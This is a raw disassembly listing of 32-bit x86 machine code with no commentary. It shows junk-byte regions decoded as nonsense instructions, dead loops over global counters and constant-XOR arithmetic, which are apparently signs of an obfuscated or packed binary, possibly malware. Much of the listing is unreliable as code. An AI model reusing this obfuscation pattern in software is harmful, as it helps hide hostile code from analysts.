  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4245ca,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [esi+edx*2+0x617cc507],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x4083f2
  40840c:	aaa    
  40840d:	jns    0x408448
  40840f:	push   eax
  408410:	shr    DWORD PTR [ecx+0x4d],1
  408413:	aam    0x92
  408415:	sub    ebp,DWORD PTR [ebx]
  408417:	test   DWORD PTR [edx+0x4f],0xd532a1c0
  40841e:	inc    ecx
  40841f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408420:	mov    ebp,0x51c495b2
  408425:	std    
  408426:	mov    ds:0x348c1760,eax
  40842b:	add    ah,al
  40842d:	iret   
  40842e:	add    BYTE PTR [edx],dl
  408430:	pop    edi
  408431:	push   0x190e4dfc
  408436:	jne    0x408438
  408438:	lock leave 
  40843a:	(bad)  
  40843b:	ins    DWORD PTR es:[edi],dx
  40843c:	jo     0x408440
  40843e:	mov    ?,WORD PTR [ecx]
  408440:	mov    eax,0x15b5cb87
  408445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408446:	mov    BYTE PTR [edi-0x42],bl
  408449:	pushf  
  40844a:	clc    
  40844b:	xchg   ebx,eax
  40844c:	in     eax,0x61
  40844e:	rol    DWORD PTR ds:0x20c65849,1
  408454:	push   esp
  408455:	in     eax,0x1
  408457:	xchg   edx,eax
  408458:	ss dec esp
  40845a:	cmc    
  40845b:	popf   
  40845c:	or     BYTE PTR [esi+0x68],al
  40845f:	cmc    
  408460:	retf   
  408461:	pop    es
  408462:	iret   
  408463:	dec    esi
  408464:	sbb    BYTE PTR [ebx+edx*1-0x79],al
  408468:	inc    edi
  408469:	pop    ecx
  40846a:	mov    ds:0xe447fdb7,al
  40846f:	pop    edx
  408470:	or     al,0x71
  408472:	loop   0x4084c4
  408474:	push   esi
  408475:	mov    dh,0xf3
  408477:	jmp    0x408413
  408479:	xchg   ebp,eax
  40847a:	inc    DWORD PTR [ebx-0x32681242]
  408480:	dec    eax
  408481:	mov    ds:0x791895c7,al
  408486:	adc    eax,0x7ff50290
  40848b:	js     0x408461
  40848d:	xchg   ecx,eax
  40848e:	jae    0x4084ec
  408490:	mov    ecx,0xbedfcaf7
  408495:	mov    edi,0x10b6f303
  40849a:	mov    bh,0x41
  40849c:	pop    ds
  40849d:	(bad)  
  40849e:	pushf  
  40849f:	mov    al,0x1b
  4084a1:	shl    BYTE PTR [edi-0x7a],1
  4084a4:	sub    ebp,DWORD PTR [ebx+0x31e64ce1]
  4084aa:	jnp    0x40845d
  4084ac:	fwait
  4084ad:	addr16 aaa 
  4084af:	mov    ch,0xa7
  4084b1:	(bad)  
  4084b2:	mov    cl,0x4e
  4084b4:	loope  0x40844d
  4084b6:	adc    BYTE PTR [edx],al
  4084b8:	pop    ds
  4084b9:	jmp    0x408500
  4084bb:	sahf   
  4084bc:	shr    BYTE PTR [ecx+ebx*2],1
  4084bf:	jne    0x40851a
  4084c1:	mov    gs,WORD PTR [ebx+0x42]
  4084c4:	inc    ebx
  4084c5:	mov    ebp,0x8a7afd21
  4084ca:	and    BYTE PTR [ebp+0x41cbfdf0],cl
  4084d0:	mov    edx,0x696a7cc
  4084d5:	popa   
  4084d6:	push   cs
  4084d7:	(bad)  
  4084d8:	fdivr  st,st(2)
  4084da:	cmp    edi,DWORD PTR [ebx-0x199f97fc]
  4084e0:	rcl    cl,0x15
  4084e3:	cld    
  4084e4:	cmp    eax,0x50207e2
  4084e9:	xor    DWORD PTR [ebx-0x3e],ebp
  4084ec:	adc    cl,dh
  4084ee:	(bad)  
  4084ef:	jl     0x40854e
  4084f1:	xchg   ebx,eax
  4084f2:	xchg   ecx,eax
  4084f3:	in     al,0x5c
  4084f5:	mov    cl,0xfc
  4084f7:	(bad)  
  4084f8:	je     0x408562
  4084fa:	ja     0x408497
  4084fc:	xor    DWORD PTR [bx+di+0x7],edx
  408500:	iret   
  408501:	jmp    0xd717:0xafb08581
  408508:	xchg   esi,eax
  408509:	jno    0x40856e
  40850b:	adc    al,0x6e
  40850d:	mov    ch,0x58
  40850f:	jnp    0x4084bc
  408511:	mov    esi,0x8fa6a2c3
  408516:	add    al,0x66
  408518:	xor    eax,DWORD PTR [ecx+0x20]
  40851b:	mov    ecx,0x3b0a
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0x4c26a896
  40854d:	lea    ebx,[eax]
  40854f:	(bad)  
  408551:	sub    bh,BYTE PTR [esi+0x7e]
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x4084e9
  408559:	xchg   ecx,eax
  40855a:	and    al,BYTE PTR [edi+0x4f64e3eb]
  408560:	adc    al,0x5e
  408562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408563:	cmp    dl,al
  408565:	in     al,dx
  408566:	loop   0x4085cb
  408568:	push   esi
  408569:	mov    cl,0x63
  40856b:	inc    ebp
  40856c:	push   ds
  40856d:	shr    ebp,1
  40856f:	xchg   ch,bl
  408571:	lahf   
  408572:	out    0x9b,al
  408574:	out    dx,eax
  408575:	das    
  408576:	sbb    eax,0x110cf831
  40857b:	sub    bl,ch
  40857d:	inc    esi
  40857e:	addr16 jg 0x40857d
  408581:	mov    ebp,0xcc882208
  408586:	sub    eax,0xa00673e3
  40858b:	jle    0x408569
  40858d:	push   esi
  40858e:	mov    ecx,0x6549db4c
  408593:	and    eax,DWORD PTR [esi+0x17d4614f]
  408599:	mov    dh,0x94
  40859b:	add    eax,0xa9d908cd
  4085a0:	in     eax,dx
  4085a1:	outs   dx,BYTE PTR ds:[esi]
  4085a2:	sbb    cl,bl
  4085a4:	push   edi
  4085a5:	cld    
  4085a6:	dec    edi
  4085a7:	(bad)  
  4085a8:	retf   0x59a5
  4085ab:	adc    al,al
  4085ad:	mov    dl,0x62
  4085af:	lods   eax,DWORD PTR ds:[esi]
  4085b0:	(bad)  
  4085b1:	adc    edx,DWORD PTR [edx-0x65]
  4085b4:	dec    edi
  4085b5:	das    
  4085b6:	lahf   
  4085b7:	es jmp 0xf0730f7f
  4085bd:	fs cmc 
  4085bf:	aad    0xc0
  4085c1:	dec    ecx
  4085c2:	imul   eax,DWORD PTR [eax],0x55b83b5c
  4085c8:	xchg   edx,eax
  4085c9:	call   0x8937:0x894abc84
  4085d0:	aam    0x73
  4085d2:	inc    esi
  4085d3:	xor    al,0x30
  4085d5:	in     eax,0x57
  4085d7:	pop    esp
  4085d8:	lea    esi,[edx+0xf4e213d]
  4085de:	lahf   
  4085df:	int3   
  4085e0:	inc    ebp
  4085e1:	out    dx,eax
  4085e2:	cmp    bl,BYTE PTR [ebx+0x42]
  4085e5:	or     ebp,DWORD PTR [ebx-0x6]
  4085e8:	js     0x40859f
  4085ea:	jp     0x40858d
  4085ec:	retf   0xc42b
  4085ef:	iret   
  4085f0:	fnstenv [eax]
  4085f2:	adc    al,BYTE PTR [ecx-0x50e9b7be]
  4085f8:	fwait
  4085f9:	fs sub al,ch
  4085fc:	stc    
  4085fd:	mov    bh,0xdc
  4085ff:	(bad)  
  408600:	push   ecx
  408601:	xchg   esp,eax
  408602:	cmp    al,0x6e
  408604:	or     ebx,DWORD PTR [ebx+0x14]
  408607:	loopne 0x4085ce
  408609:	mov    ah,0x79
  40860b:	push   0xffffffcb
  40860d:	scas   al,BYTE PTR es:[edi]
  40860e:	pop    eax
  40860f:	sbb    DWORD PTR [edx-0x4e],eax
  408612:	mov    esi,0xfff80996
  408617:	or     al,0xf7
  408619:	rcr    esp,cl
  40861b:	repz sbb ecx,ebx
  40861e:	cmp    BYTE PTR [ecx-0x6a],al
  408621:	in     eax,dx
  408622:	mov    DWORD PTR [edx],0x77a84a01
  408628:	mov    dh,0x4a
  40862a:	cmp    eax,0x5279d95
  40862f:	and    ebx,ebp
  408631:	xchg   DWORD PTR [ebx+ecx*1],edi
  408634:	mov    ds:0x825c20a5,eax
  408639:	mov    eax,0xc00a1724
  40863e:	retf   
  40863f:	pushf  
  408640:	mov    esp,0x473acc00
  408645:	xchg   ebp,ebx
  408647:	or     ecx,esi
  408649:	ins    DWORD PTR es:[edi],dx
  40864a:	loopne 0x40866d
  40864c:	jge    0x408677
  40864e:	pop    esi
  40864f:	sbb    BYTE PTR [esp+eax*4-0x1a],0xa1
  408654:	fdivr  QWORD PTR [esi+0x4c]
  408657:	cmp    al,BYTE PTR ds:0xc5679dd7
  40865d:	dec    ebx
  40865e:	mov    DWORD PTR [eax+0x2f],eax
  408661:	rol    DWORD PTR [ebp-0x70],1
  408664:	movzx  eax,ax
  408667:	add    ecx,DWORD PTR ds:0x417e49
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4245c6,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	fimul  DWORD PTR [ebp+ebx*4+0x2b09e545]
  408746:	jle    0x4087c6
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x408774
  40874d:	jecxz  0x4086e9
  40874f:	(bad)  
  408750:	jmp    0xd999717f
  408755:	cld    
  408756:	or     BYTE PTR [edx+0x55],0xc6
  40875a:	mov    ebp,0xe7be81bf
  40875f:	cmp    DWORD PTR [ebx-0x63efe493],edi
  408765:	mov    BYTE PTR [ebx],bh
  408767:	in     al,dx
  408768:	fsub   DWORD PTR [ebp-0x9f675e5]
  40876e:	add    cl,ch
  408770:	dec    eax
  408771:	dec    edx
  408772:	and    al,0x5f
  408774:	ffree  st(4)
  408776:	pop    edi
  408777:	adc    BYTE PTR [ebx],al
  408779:	jg     0x408714
  40877b:	leave  
  40877c:	stc    
  40877d:	mov    ds:0xfd857aeb,al
  408782:	pop    es
  408783:	add    BYTE PTR ds:0x4995aefa,0xbf
  40878a:	out    dx,eax
  40878b:	push   ebp
  40878c:	pop    ecx
  40878d:	add    DWORD PTR [esi-0x7d6e7399],esp
  408793:	pusha  
  408794:	pop    esp
  408795:	jmp    0x5427597b
  40879a:	jmp    DWORD PTR [edi]
  40879c:	xor    esp,DWORD PTR [ecx]
  40879e:	adc    al,0x52
  4087a0:	mov    al,0xee
  4087a2:	ds pop edx
  4087a4:	into   
  4087a5:	neg    DWORD PTR [eax-0x31]
  4087a8:	and    edi,DWORD PTR [ecx+eiz*1-0x17]
  4087ac:	sbb    al,BYTE PTR [ecx]
  4087ae:	shl    DWORD PTR [ecx],cl
  4087b0:	popf   
  4087b1:	rol    BYTE PTR [esi],0x90
  4087b4:	scas   eax,DWORD PTR es:[edi]
  4087b5:	rol    BYTE PTR [ebx+0x67e95a87],cl
  4087bb:	xchg   esi,eax
  4087bc:	sbb    bl,bh
  4087be:	outs   dx,DWORD PTR ds:[esi]
  4087bf:	xchg   ecx,eax
  4087c0:	imul   edi,DWORD PTR [ecx+0x14c58d88],0xffffffaf
  4087c7:	retf   
  4087c8:	jo     0x4087f3
  4087ca:	and    dh,BYTE PTR [ebp-0x6b]
  4087cd:	pop    ds
  4087ce:	leave  
  4087cf:	retf   0xb84
  4087d2:	lahf   
  4087d3:	stc    
  4087d4:	addr16 mov ebx,0xf5b38fcf
  4087da:	fisubr DWORD PTR [ecx-0x52]
  4087dd:	rcl    dl,1
  4087df:	loopne 0x4087f9
  4087e1:	and    esi,ebx
  4087e3:	pop    ebx
  4087e4:	imul   edi,DWORD PTR [esi+0x59],0x6973d430
  4087eb:	ret    
  4087ec:	jbe    0x408831
  4087ee:	rcr    DWORD PTR [ebx+esi*1],0x7b
  4087f2:	pusha  
  4087f3:	repnz sbb eax,0xc07fc5a2
  4087f9:	retf   
  4087fa:	jo     0x408873
  4087fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087fd:	in     eax,dx
  4087fe:	(bad)  
  4087ff:	popa   
  408800:	mov    dl,0x0
  408802:	dec    edi
  408803:	and    BYTE PTR [eax],0x1e
  408806:	inc    esp
  408807:	push   cs
  408808:	sbb    DWORD PTR [edx],ecx
  40880a:	dec    esi
  40880b:	inc    eax
  40880c:	cmp    BYTE PTR [eax],0x89
  40880f:	sub    eax,0x4ef9834c
  408814:	and    eax,0x1f7f4815
  408819:	jecxz  0x4087fb
  40881b:	les    ebx,FWORD PTR [esi]
  40881d:	dec    eax
  40881e:	jp     0x4087a6
  408820:	mov    eax,gs:0x1431c6a4
  408826:	sbb    DWORD PTR [ebx+0x3a],ecx
  408829:	sbb    BYTE PTR [eax+esi*4+0x69],dh
  40882d:	sub    BYTE PTR [ecx+0x3706cd78],dl
  408833:	scas   eax,DWORD PTR es:[edi]
  408834:	sub    DWORD PTR [eax-0x3e22548a],ecx
  40883a:	xchg   edi,eax
  40883b:	pushf  
  40883c:	cld    
  40883d:	stos   BYTE PTR es:[edi],al
  40883e:	rcr    edx,cl
  408840:	nop
  408841:	daa    
  408842:	mov    ebx,0x6aaff990
  408847:	scas   al,BYTE PTR es:[edi]
  408848:	in     eax,dx
  408849:	mov    ds:0xd6f23950,al
  40884e:	gs (bad) 
  408850:	inc    esi
  408851:	sub    al,al
  408853:	dec    edx
  408854:	pop    edx
  408855:	aaa    
  408856:	out    dx,al
  408857:	pop    esp
  408858:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40885f:	adc    DWORD PTR ds:0x412370,0x1786
  408869:	mov    DWORD PTR [ebp-0x10],0xf89c853b
  408870:	mov    eax,DWORD PTR [ebp-0x8]
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1+0x46d74167],edx
  408951:	in     al,dx
  408952:	xor    cl,0x5
  408955:	sub    BYTE PTR [esi+0x7e],bh
  408958:	or     bh,BYTE PTR [edi+0x7e]
  40895b:	jle    0x4089d1
  40895d:	repz jmp 0x4088f1
  408960:	fdivr  QWORD PTR [eax-0xa478def]
  408966:	cmp    DWORD PTR [ecx+0x10],ecx
  408969:	cld    
  40896a:	repnz and ebp,esi
  40896d:	(bad)  
  40896f:	fisttp WORD PTR [ebp+0x52]
  408972:	xchg   DWORD PTR [esp+ebp*2-0x3f773400],edi
  408979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40897a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40897b:	scas   eax,DWORD PTR es:[edi]
  40897c:	and    DWORD PTR [ecx-0x6ff7321a],eax
  408982:	xor    BYTE PTR [ecx+0x15958625],al
  408988:	push   0x2b
  40898a:	outs   dx,BYTE PTR ds:[esi]
  40898b:	jno    0x4089b5
  40898d:	sbb    DWORD PTR [edx+esi*8],ebp
  408990:	jns    0x40891b
  408992:	test   BYTE PTR [eax],ah
  408994:	inc    esp
  408995:	mov    esp,0x167904a2
  40899a:	xor    BYTE PTR [eax],ch
  40899c:	mov    al,0xf4
  40899e:	push   ds
  40899f:	add    DWORD PTR [edx],eax
  4089a1:	(bad)  
  4089a2:	cmp    DWORD PTR [ebp-0x3606ae46],ebp
  4089a8:	in     al,dx
  4089a9:	retf   0xaa15
  4089ac:	icebp  
  4089ad:	inc    ebx
  4089ae:	add    al,0x22
  4089b0:	dec    DWORD PTR [ebp-0xf4c8bb9]
  4089b6:	push   ebx
  4089b7:	cmp    bh,BYTE PTR [ecx]
  4089b9:	(bad)  
  4089ba:	clc    
  4089bb:	xchg   esi,eax
  4089bc:	(bad)  
  4089bd:	loop   0x4089d5
  4089bf:	dec    edi
  4089c0:	pop    ecx
  4089c1:	xlat   BYTE PTR ds:[ebx]
  4089c2:	out    0xa3,al
  4089c4:	into   
  4089c5:	leave  
  4089c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089c7:	call   0x9c5b34ec
  4089cc:	mov    ebx,0xb3e4d61a
  4089d1:	into   
  4089d2:	fmul   QWORD PTR [ecx+0x1d]
  4089d5:	push   ds
  4089d6:	add    DWORD PTR [ebp+0x673f08df],edx
  4089dc:	xchg   esi,eax
  4089dd:	nop
  4089de:	mov    esi,DWORD PTR [ebx+0x476bb836]
  4089e4:	push   0xffffffc0
  4089e6:	sub    bh,BYTE PTR [ecx]
  4089e8:	or     BYTE PTR [edi],ch
  4089ea:	sub    edi,edi
  4089ec:	pop    ecx
  4089ed:	add    DWORD PTR [ecx],esi
  4089ef:	mov    gs,WORD PTR [ecx+0x545e560]
  4089f5:	pushf  
  4089f6:	lods   eax,DWORD PTR ds:[esi]
  4089f7:	sti    
  4089f8:	gs add ecx,ebp
  4089fb:	mov    al,0xbf
  4089fd:	dec    edx
  4089fe:	jmp    0x408a5a
  408a00:	popf   
  408a01:	and    DWORD PTR [ebx+0x3e],esp
  408a04:	pushf  
  408a05:	push   ecx
  408a06:	pusha  
  408a07:	pop    esi
  408a08:	mov    edx,0x7bb9702d
  408a0d:	or     ebp,DWORD PTR [ebx-0x19]
  408a10:	mov    ecx,0x5b12fccd
  408a15:	cmp    ebx,DWORD PTR [esi-0x3d]
  408a18:	jo     0x408a60
  408a1a:	dec    ebp
  408a1b:	je     0x408a68
  408a1d:	pop    ds
  408a1e:	scas   al,BYTE PTR es:[edi]
  408a1f:	dec    esp
  408a20:	sti    
  408a21:	stc    
  408a22:	lods   eax,DWORD PTR ds:[esi]
  408a23:	sahf   
  408a24:	aad    0x5e
  408a26:	sti    
  408a27:	fstp   QWORD PTR [edx+0x660a9c0a]
  408a2d:	lods   eax,DWORD PTR ds:[esi]
  408a2e:	dec    eax
  408a2f:	and    cl,BYTE PTR [edx-0x72]
  408a32:	hlt    
  408a33:	and    cl,cl
  408a35:	mov    DWORD PTR [esi-0x61113b0d],ebx
  408a3b:	or     bh,BYTE PTR [esi+ebx*8]
  408a3e:	retf   0xfc88
  408a41:	leave  
  408a42:	xor    DWORD PTR [ecx],0x9e099252
  408a48:	loope  0x408a3e
  408a4a:	inc    esp
  408a4b:	pop    esp
  408a4c:	jecxz  0x4089da
  408a4e:	push   esp
  408a4f:	add    BYTE PTR [eax],0xe9
  408a52:	sahf   
  408a53:	cmp    al,0x7
  408a55:	aam    0xa9
  408a57:	mov    ebx,0x225bb72f
  408a5c:	push   0x3bee59b6
  408a61:	jo     0x408a61
  408a63:	or     eax,0x50667220
  408a68:	xor    edx,ecx
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	lahf   
  408a86:	sbb    BYTE PTR [eax+0x7e291109],bh
  408a8c:	jle    0x408a98
  408a8e:	jg     0x408b0e
  408a90:	jle    0x408ab5
  408a92:	push   ds
  408a93:	(bad)  
  408a94:	outs   dx,BYTE PTR ds:[esi]
  408a95:	xor    DWORD PTR [ebx],ecx
  408a97:	not    esi
  408a99:	stos   BYTE PTR es:[edi],al
  408a9a:	in     al,dx
  408a9b:	not    BYTE PTR [ebx]
  408a9d:	mov    bh,ah
  408a9f:	popa   
  408aa0:	dec    esp
  408aa1:	adc    BYTE PTR [eax],dl
  408aa3:	jns    0x408a97
  408aa5:	jnp    0x408a7e
  408aa7:	sahf   
  408aa8:	push   cs
  408aa9:	inc    ecx
  408aaa:	fdivr  st(2),st
  408aac:	(bad)  
  408aad:	xchg   edi,eax
  408aae:	imul   esi,DWORD PTR [ebx-0x715303d8],0xffffff89
  408ab5:	rol    DWORD PTR [edi+edi*8-0x76e0964e],0x81
  408abd:	dec    ecx
  408abe:	or     BYTE PTR [edx],bl
  408ac0:	les    ecx,FWORD PTR [eax+eax*4+0xb303a94]
  408ac7:	mov    ebp,DWORD PTR [edx]
  408ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aca:	jo     0x408a4d
  408acc:	jnp    0x408ac9
  408ace:	xchg   edi,eax
  408acf:	fwait
  408ad0:	imul   ebx,DWORD PTR [edx],0x680b824
  408ad6:	dec    esi
  408ad7:	ins    BYTE PTR es:[edi],dx
  408ad8:	sbb    ebx,DWORD PTR [ecx]
  408ada:	pop    ebp
  408adb:	iret   
  408adc:	sbb    esp,DWORD PTR [eax-0x3d]
  408adf:	loop   0x408ac8
  408ae1:	in     al,0x2a
  408ae3:	pop    ebx
  408ae4:	dec    esp
  408ae5:	enter  0xa539,0x27
  408ae9:	out    dx,eax
  408aea:	push   cs
  408aeb:	call   0x47e14d07
  408af0:	pop    ss
  408af1:	cmp    esp,DWORD PTR [esp+eax*1+0x37]
  408af5:	mov    edi,0x98aed99d
  408afa:	and    al,0x4c
  408afc:	pop    ebp
  408afd:	sbb    eax,0x8404b42f
  408b02:	push   es
  408b03:	inc    esi
  408b04:	cmp    DWORD PTR [ebp+0x4b],ebp
  408b07:	pushf  
  408b08:	loopne 0x408ae0
  408b0a:	(bad)  
  408b0b:	popa   
  408b0c:	xchg   edi,edx
  408b0e:	pop    ds
  408b0f:	mov    BYTE PTR ds:0xcabce9e0,bl
  408b15:	iret   
  408b16:	mov    esi,esi
  408b18:	pop    ds
  408b19:	inc    edi
  408b1a:	fadd   st(6),st
  408b1c:	push   eax
  408b1d:	and    al,0xa5
  408b1f:	jnp    0x408b8b
  408b21:	xor    al,BYTE PTR [ebx+0x23]
  408b24:	mov    DWORD PTR [ebp-0x3a],edi
  408b27:	mov    eax,ds:0x7d38c4ef
  408b2c:	cdq    
  408b2d:	lods   al,BYTE PTR ds:[esi]
  408b2e:	(bad)  
  408b2f:	leave  
  408b30:	(bad)  
  408b31:	jnp    0x408ab8
  408b33:	or     BYTE PTR [eax-0x9],cl
  408b36:	stos   DWORD PTR es:[edi],eax
  408b37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b38:	xchg   al,bh
  408b3a:	jmp    0x408aec
  408b3c:	and    al,0x2e
  408b3e:	js     0x408b70
  408b40:	fucom  st(1)
  408b42:	in     al,0x73
  408b44:	loop   0x408b67
  408b46:	add    eax,eax
  408b48:	out    dx,al
  408b49:	or     BYTE PTR [ecx],ch
  408b4b:	adc    BYTE PTR [esi-0x327b1eb7],al
  408b51:	lods   al,BYTE PTR ds:[esi]
  408b52:	pop    ss
  408b53:	data16 sahf 
  408b55:	shr    DWORD PTR [ebp+0x3db330c6],0x51
  408b5c:	pop    eax
  408b5d:	sub    ecx,DWORD PTR [eax-0xa]
  408b60:	mov    esp,0xd620e414
  408b65:	mov    ch,0x4b
  408b67:	jp     0x408bc1
  408b69:	pop    ds
  408b6a:	repz aad 0xf7
  408b6d:	lds    eax,FWORD PTR [edx+0x727dedf4]
  408b73:	sub    BYTE PTR [ecx-0x40],bl
  408b76:	out    0x38,eax
  408b78:	sbb    edi,DWORD PTR [ecx+0x2c]
  408b7b:	sbb    ecx,ebx
  408b7d:	pop    es
  408b7e:	dec    ebx
  408b7f:	fsub   DWORD PTR [edx+0xf]
  408b82:	add    eax,0xb83b3e60
  408b87:	imul   eax,edi,0x60
  408b8a:	dec    esi
  408b8b:	mov    ds:0x674e917a,al
  408b90:	cmp    al,0x2b
  408b92:	cmp    DWORD PTR [edi+0x50ab0a09],esi
  408b98:	xchg   edi,eax
  408b99:	push   ds
  408b9a:	shr    ch,cl
  408b9c:	mov    dl,BYTE PTR [ebx+0x57]
  408b9f:	mov    edi,DWORD PTR [ebp+0x8]
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx+0x4f1369bd]
  408bcf:	push   edx
  408bd0:	test   BYTE PTR cs:0xa7e7e2e,ch
  408bd7:	jg     0x408c57
  408bd9:	jle    0x408b9a
  408bdb:	pop    edx
  408bdc:	fidiv  DWORD PTR [ebx]
  408bde:	push   0x4e
  408be0:	gs mov dl,bh
  408be3:	icebp  
  408be4:	es loope 0x408c1d
  408be7:	popf   
  408be8:	or     BYTE PTR [esi],dl
  408bea:	clc    
  408beb:	rcl    ecx,cl
  408bed:	pop    edi
  408bee:	(bad)  
  408bef:	mov    dh,0xd0
  408bf1:	ds jns 0x408c08
  408bf4:	imul   ecx,DWORD PTR [bp+0x46],0x37edc244
  408bfc:	push   esi
  408bfd:	das    
  408bfe:	ficom  WORD PTR ss:[ebp+0x75]
  408c02:	sub    eax,0x75b56a09
